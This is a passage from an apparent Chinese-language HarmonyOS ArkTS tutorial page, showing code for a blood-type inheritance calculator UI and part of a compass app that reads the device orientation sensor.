class="subst">$&#123;possibleBloodTypes.join(<span class="string">&#x27;、&#x27;</span>)&#125;</span>`</span>); <span class="comment">// 显示可能的血型</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">impossibleBloodTypesText</span> = <span class="string">`孩子不可能血型：<span class="subst">$&#123;impossibleBloodTypes.join(<span class="string">&#x27;、&#x27;</span>)&#125;</span>`</span>); <span class="comment">// 显示不可能的血型</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 当胶囊按钮的选择发生变化时调用此函数</span></span><br><span class="line">  <span class="title function_">capsuleSelectedIndexesChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">father</span>: string = <span class="variable language_">this</span>.<span class="property">bloodTypeList</span>[<span class="variable language_">this</span>.<span class="property">fatherBloodTypeIndex</span>[<span class="number">0</span>]][<span class="string">&#x27;text&#x27;</span>]; <span class="comment">// 获取父亲选择的血型</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">mother</span>: string = <span class="variable language_">this</span>.<span class="property">bloodTypeList</span>[<span class="variable language_">this</span>.<span class="property">motherBloodTypeIndex</span>[<span class="number">0</span>]][<span class="string">&#x27;text&#x27;</span>]; <span class="comment">// 获取母亲选择的血型</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculatePossibleBloodTypes</span>(father, mother); <span class="comment">// 计算并更新血型信息</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 在组件即将出现时调用此函数</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span> = <span class="title class_">SegmentButtonOptions</span>.<span class="title function_">capsule</span>(&#123;</span><br><span class="line">      <span class="attr">buttons</span>: <span class="variable language_">this</span>.<span class="property">bloodTypeList</span> <span class="keyword">as</span> <span class="title class_">SegmentButtonItemTuple</span>, <span class="comment">// 设置胶囊按钮的选项</span></span><br><span class="line">      <span class="attr">multiply</span>: <span class="literal">false</span>, <span class="comment">// 单选模式</span></span><br><span class="line">      <span class="attr">fontColor</span>: <span class="title class_">Color</span>.<span class="property">White</span>, <span class="comment">// 字体颜色为白色</span></span><br><span class="line">      <span class="attr">selectedFontColor</span>: <span class="title class_">Color</span>.<span class="property">White</span>, <span class="comment">// 选中时字体颜色为白色</span></span><br><span class="line">      <span class="attr">selectedBackgroundColor</span>: <span class="variable language_">this</span>.<span class="property">themeColor</span>, <span class="comment">// 选中背景色为主题色</span></span><br><span class="line">      <span class="attr">backgroundColor</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 背景色为边框颜色</span></span><br><span class="line">      <span class="attr">backgroundBlurStyle</span>: <span class="title class_">BlurStyle</span>.<span class="property">BACKGROUND_THICK</span> <span class="comment">// 背景模糊效果</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">capsuleSelectedIndexesChanged</span>(); <span class="comment">// 初始化时调用选择变化处理函数</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建用户界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// 页面标题</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;血型遗传计算&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// 文本颜色</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 字体大小</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 宽度为100%</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// 高度为50</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// 文本居中对齐</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 背景色为白色</span></span><br><span class="line">        .<span class="title function_">shadow</span>(&#123; <span class="comment">// 添加阴影效果</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">2</span>, <span class="comment">// 阴影半径</span></span><br><span class="line">          <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 阴影颜色</span></span><br><span class="line">          <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// 水平偏移量</span></span><br><span class="line">          <span class="attr">offsetY</span>: <span class="number">5</span> <span class="comment">// 垂直偏移量</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 工具介绍部分</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;工具介绍&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontWeight</span>(<span class="number">600</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;血型是以A、B、O三种遗传因子的组合而决定的，根据父母的血型，就可以判断出以后出生的孩子的血型。&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 父亲血型选择部分</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;父亲血型&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">          <span class="title class_">SegmentButton</span>(&#123;</span><br><span class="line">            <span class="attr">options</span>: <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span>, <span class="comment">// 胶囊按钮的配置项</span></span><br><span class="line">            <span class="attr">selectedIndexes</span>: <span class="variable language_">this</span>.<span class="property">fatherBloodTypeIndex</span> <span class="comment">// 当前选中的索引</span></span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 母亲血型选择部分</span></span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;母亲血型&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">          <span class="title class_">SegmentButton</span>(&#123;</span><br><span class="line">            <span class="attr">options</span>: <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span>, <span class="comment">// 胶囊按钮的配置项</span></span><br><span class="line">            <span class="attr">selectedIndexes</span>: <span class="variable language_">this</span>.<span class="property">motherBloodTypeIndex</span> <span class="comment">// 当前选中的索引</span></span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 显示计算结果</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">possibleBloodTypesText</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">impossibleBloodTypesText</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f4f8fb&quot;</span>); <span class="comment">// 页面背景色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="compass"><a href="#compass" class="headerlink" title="compass"></a>compass</h1><p>指南针</p><p>传感器 角度计算</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; sensor &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.SensorServiceKit&#x27;</span>; <span class="comment">// 导入传感器服务模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BusinessError</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// 导入业务错误处理模块</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义方向范围类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DirectionRange</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 方向名称</span></span><br><span class="line">  <span class="attr">min</span>: number = <span class="number">0</span>; <span class="comment">// 最小角度</span></span><br><span class="line">  <span class="attr">max</span>: number = <span class="number">0</span>; <span class="comment">// 最大角度</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义各个方向的范围</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">DIRECTION_RANGES</span>: <span class="title class_">DirectionRange</span>[] = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;北&#x27;</span>, <span class="attr">min</span>: <span class="number">337.5</span>, <span class="attr">max</span>: <span class="number">360</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;北&#x27;</span>, <span class="attr">min</span>: <span class="number">0</span>, <span class="attr">max</span>: <span class="number">22.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;东北&#x27;</span>, <span class="attr">min</span>: <span class="number">22.5</span>, <span class="attr">max</span>: <span class="number">67.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;东&#x27;</span>, <span class="attr">min</span>: <span class="number">67.5</span>, <span class="attr">max</span>: <span class="number">112.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;东南&#x27;</span>, <span class="attr">min</span>: <span class="number">112.5</span>, <span class="attr">max</span>: <span class="number">157.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;南&#x27;</span>, <span class="attr">min</span>: <span class="number">157.5</span>, <span class="attr">max</span>: <span class="number">202.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;西南&#x27;</span>, <span class="attr">min</span>: <span class="number">202.5</span>, <span class="attr">max</span>: <span class="number">247.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;西&#x27;</span>, <span class="attr">min</span>: <span class="number">247.5</span>, <span class="attr">max</span>: <span class="number">292.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;西北&#x27;</span>, <span class="attr">min</span>: <span class="number">292.5</span>, <span class="attr">max</span>: <span class="number">337.5</span> &#125;</span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义指南针组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Compass</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">directionMessage</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 当前方向的名称</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// 当前旋转角度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentAngle</span>: number = <span class="number">0</span>; <span class="comment">// 当前传感器角度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cumulativeRotation</span>: number = <span class="number">0</span>; <span class="comment">// 累计旋转角度</span></span><br><span class="line">  private <span class="attr">threshold</span>: number = <span class="number">1</span>; <span class="comment">// 设置阈值，用于过滤小的旋转变化</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组件即将出现时调用</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    sensor.<span class="title function_">getSensorList</span>(<span class="function">(<span class="params">error: BusinessError</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取传感器列表失败&#x27;</span>, error); <span class="comment">// 如果获取传感器列表失败，打印错误信息</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">startOrientationUpdates</span>(); <span class="comment">// 开始监听传感器数据</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 开始监听传感器的方位数据</span></span><br><span class="line">  private <span class="title function_">startOrientationUpdates</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    sensor.<span class="title function_">on</span>(sensor.<span class="property">SensorId</span>.<span class="property">ORIENTATION</span>, <span class="function">(<span class="params">orientationData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> alpha = orientationData.<span class="property">alpha</span>; <span class="comment">// 获取当前的方位角</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">directionMessage</span> = <span class="variable language_">this</span>.<span class="title function_">calculateDirection</span>(alpha); <span class="comment">// 计算当前方向</span></span><br><span class="line">      <span class="keyword">const</span> angleDifference = <span class="variable language_">this</span>.<span class="title function_">calculateAngleDifference</span>(<span class="variable language_">this</span>.<span class="property">currentAngle</span>, alpha); <span class="comment">// 计算角度差</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(angleDifference) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span>) &#123; <span class="comment">// 如果角度变化超过阈值</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">updateRotationAngle</span>(angleDifference, alpha); <span class="comment">// 更新旋转角度</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123; <span class="attr">interval</span>: <span class="number">10000000</span> &#125;); <span class="comment">// 设置传感器更新间隔，单位为纳秒，10000000表示1秒</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算两个角度之间的差异</span></span><br><span class="line">  private <span class="title function_">calculateAngleDifference</span>(<span class="attr">currentAngle</span>: number, <span class="attr">targetAngle</span>: number): number &#123;</span><br><span class="line">    <span class="keyword">let</span> diff = targetAngle - currentAngle; <span class="comment">// 计算角度差</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (diff &gt; <span class="number">180</span>) &#123;</span><br><span class="line">      diff -= <span class="number">360</span>; <span class="comment">// 顺时针旋转超过180度，调整为负值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; -<span class="number">180</span>) &#123;</span><br><span class="line">      diff += <span class="number">360</span>; <span class="comment">// 逆时针旋转超过180度，调整为正值</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> diff; <span class="comment">// 返回调整后的角度差</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 更新旋转角度</span></span><br><span class="line">  private <span class="title function_">updateRotationAngle</span>(<span class="attr">angleDifference</span>: number, <span class="attr">newAngle</span>: number): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cumulativeRotation</span> += angleDifference; <span class="comment">// 累加旋转角度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> += angleDifference; <span class="comment">// 更新当前旋转角度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentAngle</span> = newAngle; <span class="comment">// 更新当前传感器角度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 动画更新</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">cumulativeRotation</span>; <span class="comment">// 将旋转角度设置为累计旋转角度</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`累计旋转角度: <span class="subst">$&#123;<span class="variable language_">this</span>.cumulativeRotation&#125;</span>`</span>); <span class="comment">// 打印累计旋转角度</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 根据角度计算方向</span></span><br><span class="line">  private <span class="title function_">calculateDirection</span>(<span class="attr">angle</span>: number): string &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> range <span class="keyword">of</span> <span class="variable constant_">DIRECTION_RANGES</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (angle &gt;= range.<span class="property">min</span> &amp;&amp; angle &lt; range.<span class="property">max</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> range.<span class="property">name</span>; <span class="comment">// 返回对应的方向名称</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;未知方向&#x27;</span>; <span class="comment">// 如果角度不在任何范围内，返回未知方向</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建用户界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// 创建一个列布局，设置间距为20</span></span><br><span class="line">      <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// 创建一个行布局，设置间距为5</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">directionMessage</span>) <span class="comment">// 显示当前方向</span></span><br><span class="line">          .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// 设置布局权重</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">End</span>) <span class="comment">// 文本对齐方式</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>) <span class="comment">// 文本颜色</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">50</span>); <span class="comment">// 文本大小</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.currentAngle)&#125;</span>°`</span>) <span class="comment">// 显示当前角度</span></span><br><span class="line">          .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// 设置布局权重</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>) <span class="comment">// 文本对齐方式</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>) <span class="comment">// 文本颜色</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">50</span>); <span class="comment">// 文本大小</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;); <span class="comment">// 设置宽度和上边距</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建一个堆叠布局</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123; <span class="comment">// 内部堆叠布局</span></span><br><span class="line">          <span class="title class_">Circle</span>() <span class="comment">// 创建一个圆形</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">250</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">250</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">fillOpacity</span>(<span class="number">0</span>) <span class="comment">// 设置填充透明度</span></span><br><span class="line">            .<span class="title function_">strokeWidth</span>(<span class="number">25</span>) <span 